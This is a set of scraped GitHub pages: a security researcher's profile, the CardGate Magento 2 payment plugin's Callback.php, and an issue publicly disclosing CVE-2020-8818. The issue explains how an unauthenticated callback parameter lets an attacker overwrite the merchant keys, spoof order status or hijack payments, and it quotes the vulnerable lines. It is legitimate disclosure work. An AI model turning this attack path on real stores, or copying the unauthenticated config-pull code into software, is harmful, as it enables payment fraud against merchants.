=== Content from github.com_d889069a_20250119_142136.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F633kh4ck)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F633kh4ck)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@633kh4ck](https://avatars.githubusercontent.com/u/13217806?s=64&v=4)

**633kh4ck**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2F633kh4ck)

[Overview](/633kh4ck)
[Repositories
1](/633kh4ck?tab=repositories)
[Projects
0](/633kh4ck?tab=projects)
[Packages
0](/633kh4ck?tab=packages)
[Stars
0](/633kh4ck?tab=stars)

More

* [Overview](/633kh4ck)
* [Repositories](/633kh4ck?tab=repositories)
* [Projects](/633kh4ck?tab=projects)
* [Packages](/633kh4ck?tab=packages)
* [Stars](/633kh4ck?tab=stars)

![@633kh4ck](https://avatars.githubusercontent.com/u/13217806?s=64&v=4)

**633kh4ck**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2F633kh4ck)

[![View 633kh4ck's full-sized avatar](https://avatars.githubusercontent.com/u/13217806?v=4)](https://avatars.githubusercontent.com/u/13217806?v=4)

# Vladislav Svolsky 633kh4ck

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2F633kh4ck)

Cybersecurity Engineer Ã— Ethical Hacker
[8
followers](https://github.com/633kh4ck?tab=followers) Â· [2
following](https://github.com/633kh4ck?tab=following)

* [t.me/GeekHack](http://t.me/GeekHack)
* LinkedIn

  [in/svolsky](https://linkedin.com/in/svolsky)

## [Achievements](/633kh4ck?tab=achievements)

[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x2](/633kh4ck?achievement=pull-shark&tab=achievements)[![Achievement: Pair Extraordinaire](https://github.githubassets.com/assets/pair-extraordinaire-default-579438a20e01.png)](/633kh4ck?achievement=pair-extraordinaire&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/633kh4ck?achievement=yolo&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/633kh4ck?achievement=arctic-code-vault-contributor&tab=achievements)
## [Achievements](/633kh4ck?tab=achievements)

[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x2](/633kh4ck?achievement=pull-shark&tab=achievements)[![Achievement: Pair Extraordinaire](https://github.githubassets.com/assets/pair-extraordinaire-default-579438a20e01.png)](/633kh4ck?achievement=pair-extraordinaire&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/633kh4ck?achievement=yolo&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/633kh4ck?achievement=arctic-code-vault-contributor&tab=achievements)
## Organizations

[![@hackday-ru](https://avatars.githubusercontent.com/u/8526175?s=64&v=4)](/hackday-ru) [![@GeekHackLab](https://avatars.githubusercontent.com/u/13217828?s=64&v=4)](/GeekHackLab) [![@highload-zone](https://avatars.githubusercontent.com/u/53948129?s=64&v=4)](/highload-zone) [![@UNESCOIITE](https://avatars.githubusercontent.com/u/81422522?s=64&v=4)](/UNESCOIITE)

Block or Report

# Block or report 633kh4ck

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this userâ€™s behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=633kh4ck+%28user%29)

[Overview](/633kh4ck)
[Repositories
1](/633kh4ck?tab=repositories)
[Projects
0](/633kh4ck?tab=projects)
[Packages
0](/633kh4ck?tab=packages)
[Stars
0](/633kh4ck?tab=stars)

More

* [Overview](/633kh4ck)
* [Repositories](/633kh4ck?tab=repositories)
* [Projects](/633kh4ck?tab=projects)
* [Packages](/633kh4ck?tab=packages)
* [Stars](/633kh4ck?tab=stars)

## Popular repositories Loading

1. [probable-octo-doodle](/633kh4ck/probable-octo-doodle) probable-octo-doodle
   Public

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from github.com_ce019242_20250119_125219.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcardgate%2Fmagento2%2Fblob%2F715979e54e1a335d78a8c5586f9e9987c3bf94fd%2FController%2FPayment%2FCallback.php)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcardgate%2Fmagento2%2Fblob%2F715979e54e1a335d78a8c5586f9e9987c3bf94fd%2FController%2FPayment%2FCallback.php)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=cardgate%2Fmagento2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cardgate](/cardgate)
/
**[magento2](/cardgate/magento2)**
Public

* [Notifications](/login?return_to=%2Fcardgate%2Fmagento2) You must be signed in to change notification settings
* [Fork
  8](/login?return_to=%2Fcardgate%2Fmagento2)
* [Star
   7](/login?return_to=%2Fcardgate%2Fmagento2)

* [Code](/cardgate/magento2)
* [Issues
  0](/cardgate/magento2/issues)
* [Pull requests
  0](/cardgate/magento2/pulls)
* [Actions](/cardgate/magento2/actions)
* [Projects
  0](/cardgate/magento2/projects)
* [Security](/cardgate/magento2/security)
* [Insights](/cardgate/magento2/pulse)

Additional navigation options

* [Code](/cardgate/magento2)
* [Issues](/cardgate/magento2/issues)
* [Pull requests](/cardgate/magento2/pulls)
* [Actions](/cardgate/magento2/actions)
* [Projects](/cardgate/magento2/projects)
* [Security](/cardgate/magento2/security)
* [Insights](/cardgate/magento2/pulse)

## Files

Â 715979e
## Breadcrumbs

1. [magento2](/cardgate/magento2/tree/715979e54e1a335d78a8c5586f9e9987c3bf94fd)
2. /[Controller](/cardgate/magento2/tree/715979e54e1a335d78a8c5586f9e9987c3bf94fd/Controller)
3. /[Payment](/cardgate/magento2/tree/715979e54e1a335d78a8c5586f9e9987c3bf94fd/Controller/Payment)
/
# Callback.php

Copy path Blame  Blame
## Latest commit

## History

[History](/cardgate/magento2/commits/715979e54e1a335d78a8c5586f9e9987c3bf94fd/Controller/Payment/Callback.php)271 lines (237 loc) Â· 9.64 KBÂ 715979e
## Breadcrumbs

1. [magento2](/cardgate/magento2/tree/715979e54e1a335d78a8c5586f9e9987c3bf94fd)
2. /[Controller](/cardgate/magento2/tree/715979e54e1a335d78a8c5586f9e9987c3bf94fd/Controller)
3. /[Payment](/cardgate/magento2/tree/715979e54e1a335d78a8c5586f9e9987c3bf94fd/Controller/Payment)
/
# Callback.php

Top
## File metadata and controls

* Code
* Blame

271 lines (237 loc) Â· 9.64 KB[Raw](https://github.com/cardgate/magento2/raw/715979e54e1a335d78a8c5586f9e9987c3bf94fd/Controller/Payment/Callback.php)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271<?php/\*\* \* Copyright (c) 2018 CardGate B.V. \* All rights reserved. \* See LICENSE for license details. \*/namespace Cardgate\Payment\Controller\Payment;
use Cardgate\Payment\Model\GatewayClient;use Cardgate\Payment\Model\Config\Master;use Magento\Framework\App\ObjectManager;use Magento\Sales\Api\Data\TransactionInterface;
/\*\* \* Callback handler action \* \* @author DBS B.V. \* @package Magento2 \*/class Callback extends \Magento\Framework\App\Action\Action {
 /\*\* \* \* @var \Magento\Sales\Model\Order\Email\Sender\OrderSender \*/ protected $orderSender;
 /\*\* \* \* @var \Magento\Sales\Model\Order\Email\Sender\InvoiceSender \*/ protected $invoiceSender;
 /\*\* \* \* @var \Magento\Framework\App\Config\ScopeConfigInterface \*/ protected $scopeConfig;
 /\*\* \* \* @var GatewayClient \*/ private $\_cardgateClient;
 /\*\* \* \* @var Master \*/ private $\_cardgateConfig;
 /\*\* \* \* @var \Magento\Framework\Encryption\Encryptor \*/ private $encryptor;
 public function \_\_construct ( \Magento\Framework\App\Action\Context $context, \Magento\Sales\Model\Order\Email\Sender\OrderSender $orderSender, \Magento\Sales\Model\Order\Email\Sender\InvoiceSender $invoiceSender, \Magento\Framework\App\Config\ScopeConfigInterface $scopeConfig, GatewayClient $client, \Cardgate\Payment\Model\Config $config) { $encryptor = ObjectManager::getInstance()->get( \Magento\Framework\Encryption\Encryptor::class ); parent::\_\_construct( $context ); $this->invoiceSender = $invoiceSender; $this->orderSender = $orderSender; $this->scopeConfig = $scopeConfig; $this->\_cardgateConfig = $config; $this->\_cardgateClient = $client; $this->encryptor = $encryptor; }
 /\*\* \* \* {@inheritdoc} \* \* @see \Magento\Framework\App\ActionInterface::execute() \*/ public function execute () { $result = $this->resultFactory->create( \Magento\Framework\Controller\ResultFactory::TYPE\_RAW ); $order = $payment = NULL; $post = $this->getRequest()->getPostValue(); if ( ! is\_array( $post ) ) { $post = []; } $get = $this->getRequest()->getParams(); if ( ! is\_array( $get ) ) { $get = []; }
 if (!empty($get['cgp\_sitesetup']) && !empty($get['token'])) {
 try { $bIsTest = ($get['testmode'] == 1 ? true : false); $aResult = $this->\_cardgateClient->pullConfig($get['token'], $bIsTest); $aConfigData = $aResult['pullconfig']['content']; $this->\_cardgateConfig->setGlobal( 'testmode', $aConfigData['testmode'] ); $this->\_cardgateConfig->setGlobal( 'site\_id', $aConfigData['site\_id'] ); $this->\_cardgateConfig->setGlobal( 'site\_key', $aConfigData['site\_key'] ); $this->\_cardgateConfig->setGlobal( 'api\_username', $aConfigData['merchant\_id'] ); $this->\_cardgateConfig->setGlobal('api\_password', $this->encryptor->encrypt($aConfigData['api\_key'] )); $typeListInterface = ObjectManager::getInstance()->get( \Magento\Framework\App\Cache\TypeListInterface::class ); $typeListInterface->cleanType('config'); $sResponse = $this->\_cardgateConfig->getGlobal('api\_username') . '.' . $this->\_cardgateConfig->getGlobal('site\_id') . '.200'; return $this->getResponse()->setBody($sResponse);
 } catch (\Exception $e) { return $this->getResponse()->setBody($e->getMessage()); } }
 $transactionId = empty( $post['transaction'] ) ? $this->getRequest()->getParam( 'transaction' ) : $post['transaction']; $reference = empty( $post['reference'] ) ? $this->getRequest()->getParam( 'reference' ) : $post['reference']; $code = (int)( empty( $post['code'] ) ? $this->getRequest()->getParam( 'code' ) : $post['code'] ); $currency = empty( $post['currency'] ) ? $this->getRequest()->getParam( 'currency' ) : $post['currency']; $amount = (int)( empty( $post['amount'] ) ? $this->getRequest()->getParam( 'amount' ) : $post['amount'] ); $pt = empty( $post['pt'] ) ? $this->getRequest()->getParam( 'pt' ) : $post['pt']; $pmId = ( ! empty( $pt ) ? $pt : 'unknown' );
 $manualProcessing = !!$this->\_cardgateConfig->getGlobal( 'manually\_process\_order' ); $updateCardgateData = false; $payment = null; try { if ( FALSE == $this->\_cardgateClient->transactions()->verifyCallback( empty( $post ) ? $get : $post, $this->\_cardgateClient->getSiteKey() ) ) { throw new \Exception( 'hash verification failure' ); }
 $order = ObjectManager::getInstance()->create( \Magento\Sales\Model\Order::class )->loadByIncrementId( $reference ); $order->addStatusHistoryComment( \_\_( "Update for transaction %1. Received status code %2.", $transactionId, $code ) );
 if ( !$manualProcessing ) { $payment = $order->getPayment(); $updateCardgateData = ! ( $payment->getCardgateStatus() >= 200 && $payment->getCardgateStatus() < 300 );
 // If the gateway is using a different payment method than us, update the payment method of our order to // match the one from the gateway. if ( $payment->getCardgatePaymentmethod() != $pmId ) { $payment->setCardgatePaymentmethod( $pmId ); $order->addStatusHistoryComment( \_\_( "Callback received for transaction %1 with payment method '%2' but payment method should be '%3'. Processing anyway.", $transactionId, $pmId, $order->getPayment()->getCardgatePaymentmethod() ) ); } }
 if ( $code < 100 ) { // 0xx pending if ( $order->getState() != \Magento\Sales\Model\Order::STATE\_NEW ) { $order->addStatusHistoryComment( \_\_( 'Transaction already processed.' ) ); } } elseif ( $code < 200 ) { // 1xx auth phase if ( $order->getState() != \Magento\Sales\Model\Order::STATE\_NEW ) { $order->addStatusHistoryComment( \_\_( 'Transaction already processed.' ) ); } } elseif ( $code < 300 ) { // 2xx success if ( $order->getState() == \Magento\Sales\Model\Order::STATE\_NEW ) { $order->setState(\Magento\Sales\Model\Order::STATE\_PROCESSING); } $order->setStatus( "cardgate\_payment\_success" ); $order->addStatusHistoryComment( \_\_( "Transaction success." ) );
 if ( !$manualProcessing ) { // Uncancel if needed. if ( $order->isCanceled() ) { $stockRegistry = ObjectManager::getInstance()->get( \Magento\CatalogInventory\Model\Spi\StockRegistryProviderInterface::class ); foreach ( $order->getItems() as $item ) { $stockItem = $stockRegistry->getStockItem( $item->getProductId(), $order->getStore()->getWebsiteId() ); $stockItem->setQty( $stockItem->getQty() - $item->getQtyCanceled() ); $stockItem->save();
 $item->setQtyCanceled( 0 ); $item->setTaxCanceled( 0 ); $item->setDiscountTaxCompensationCanceled( 0 ); $item->save(); } $order->addStatusHistoryComment( \_\_( 'Transaction rebooked. Product stock reclaimed from inventory.' ) ); }
 // Test if transaction has been processed already. $paymentRepository = ObjectManager::getInstance()->get( \Magento\Sales\Model\Order\Payment\Transaction\Repository::class ); $currentTransaction = $paymentRepository->getByTransactionId( $transactionId, $payment->getId(), $order->getId() ); if ( ! empty( $currentTransaction ) && $currentTransaction->getTxnType() == TransactionInterface::TYPE\_CAPTURE ) { $order->addStatusHistoryComment( \_\_( 'Transaction already processed.' ) ); $updateCardgateData = FALSE; throw new \Exception( 'transaction already processed.' ); }
 // Test if payment has been processed already. if ( $payment->getCardgateStatus() >= 200 && $payment->getCardgateStatus() < 300 ) { $order->addStatusHistoryComment( \_\_( 'Payment already processed in another transaction.' ) ); $updateCardgateData = FALSE; throw new \Exception( 'payment already processed in another transaction.' ); }
 // Do capture. $payment->setTransactionId( $transactionId ); $payment->setCurrencyCode( $currency ); $payment->registerCaptureNotification( $amount / 100 ); $payment->setMethod( 'cardgate\_' . $pt );
 if ( ! $order->getEmailSent() ) { $this->orderSender->send( $order ); }
 $invoice = $payment->getCreatedInvoice(); if ( ! empty( $invoice ) ) { $invoice->save(); // makes sure there's an invoice id generated $this->invoiceSender->send( $invoice ); } else { $order->addStatusHistoryComment( \_\_( 'Failed to create invoice.' ) ); throw new \Exception( 'failed to create invoice.' ); } } } elseif ( $code < 400 ) { // 3xx error if ( !$manualProcessing ) { try { $order->registerCancellation( \_\_( 'Transaction canceled.' ), false ); $order->setStatus( "cardgate\_payment\_failure" ); $order->addStatusHistoryComment( \_\_( "Transaction failure." ) ); } catch ( \Exception $e ) { $order->addStatusHistoryComment( \_\_( "Failed to cancel order. Order state was : %1.", $order->getState() . '/' . $order->getStatus() ) ); throw new \Exception( 'failed to cancel order.' ); } } } elseif ( $code < 500 ) { // 4xx refund if ( !$manualProcessing ) { $order->registerCancellation( \_\_( "Transaction refund received. Amount %1.", $currency . ' ' . round( $amount / 100, 2 ) ) ); } } elseif ( $code >= 600 && $code < 700 ) { // 6xx notification from bank } elseif ( $code < 800 ) { // 7xx waiting for confirmation }
 // Set the output to a string that the gateway expects. $result->setContents( $transactionId . '.' . $code );
 } catch ( \Exception $e ) {
 // Add the exception message to the output. $result->setContents( $e->getMessage() ); }
 if ( $payment != NULL && $updateCardgateData ) { $payment->setCardgateStatus( $code ); $payment->setCardgateTransaction( $transactionId ); $payment->save(); }
 if ( $order != NULL ) { $order->save(); }
 return $result; }
}

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from github.com_408a83b5_20250119_142136.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcardgate%2Fmagento2%2Fissues%2F54)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcardgate%2Fmagento2%2Fissues%2F54)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=cardgate%2Fmagento2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cardgate](/cardgate)
/
**[magento2](/cardgate/magento2)**
Public

* [Notifications](/login?return_to=%2Fcardgate%2Fmagento2) You must be signed in to change notification settings
* [Fork
  8](/login?return_to=%2Fcardgate%2Fmagento2)
* [Star
   7](/login?return_to=%2Fcardgate%2Fmagento2)

* [Code](/cardgate/magento2)
* [Issues
  0](/cardgate/magento2/issues)
* [Pull requests
  0](/cardgate/magento2/pulls)
* [Actions](/cardgate/magento2/actions)
* [Projects
  0](/cardgate/magento2/projects)
* [Security](/cardgate/magento2/security)
* [Insights](/cardgate/magento2/pulse)

Additional navigation options

* [Code](/cardgate/magento2)
* [Issues](/cardgate/magento2/issues)
* [Pull requests](/cardgate/magento2/pulls)
* [Actions](/cardgate/magento2/actions)
* [Projects](/cardgate/magento2/projects)
* [Security](/cardgate/magento2/security)
* [Insights](/cardgate/magento2/pulse)

# Public disclosure on CVE-2020-8818 [Unauthorized Payments Hijacking + Order Status Spoofing]Â #54

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Public disclosure on CVE-2020-8818 [Unauthorized Payments Hijacking + Order Status Spoofing]](#top)#54Copy link![@633kh4ck](https://avatars.githubusercontent.com/u/13217806?u=79ac0a09fc4376119859036a81c9c509f2774077&v=4&size=80)
## Description

![@633kh4ck](https://avatars.githubusercontent.com/u/13217806?u=79ac0a09fc4376119859036a81c9c509f2774077&v=4&size=48)[633kh4ck](https://github.com/633kh4ck)opened [on Feb 24, 2020](https://github.com/cardgate/magento2/issues/54#issue-570050974)
### [CVE-2020-8818](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8818)

Lack of origin authentication ([CWE-346](https://cwe.mitre.org/data/definitions/346.html)) at IPN callback processing function allow (**even *unauthorized***) attacker to remotely replace critical plugin settings (merchant id, secret key etc) with known to him and therefore bypass payment process (eg. spoof order status by manually sending IPN callback request with a valid signature but without real payment) and/or receive all subsequent payments (on behalf of the store).

### Vulnerable code (fixed in PR [#53](https://github.com/cardgate/magento2/pull/53))

[magento2/Controller/Payment/Callback.php](https://github.com/cardgate/magento2/blob/715979e54e1a335d78a8c5586f9e9987c3bf94fd/Controller/Payment/Callback.php#L88-L107)

Lines 88 to 107
in
[715979e](/cardgate/magento2/commit/715979e54e1a335d78a8c5586f9e9987c3bf94fd)

|  | if (!empty($get['cgp\_sitesetup']) && !empty($get['token'])) { |
| --- | --- |
|  |  |
|  | try { |
|  | $bIsTest = ($get['testmode'] == 1 ? true : false); |
|  | $aResult = $this->\_cardgateClient->pullConfig($get['token'], $bIsTest); |
|  | $aConfigData = $aResult['pullconfig']['content']; |
|  | $this->\_cardgateConfig->setGlobal( 'testmode', $aConfigData['testmode'] ); |
|  | $this->\_cardgateConfig->setGlobal( 'site\_id', $aConfigData['site\_id'] ); |
|  | $this->\_cardgateConfig->setGlobal( 'site\_key', $aConfigData['site\_key'] ); |
|  | $this->\_cardgateConfig->setGlobal( 'api\_username', $aConfigData['merchant\_id'] ); |
|  | $this->\_cardgateConfig->setGlobal('api\_password', $this->encryptor->encrypt($aConfigData['api\_key'] )); |
|  | $typeListInterface = ObjectManager::getInstance()->get( \Magento\Framework\App\Cache\TypeListInterface::class ); |
|  | $typeListInterface->cleanType('config'); |
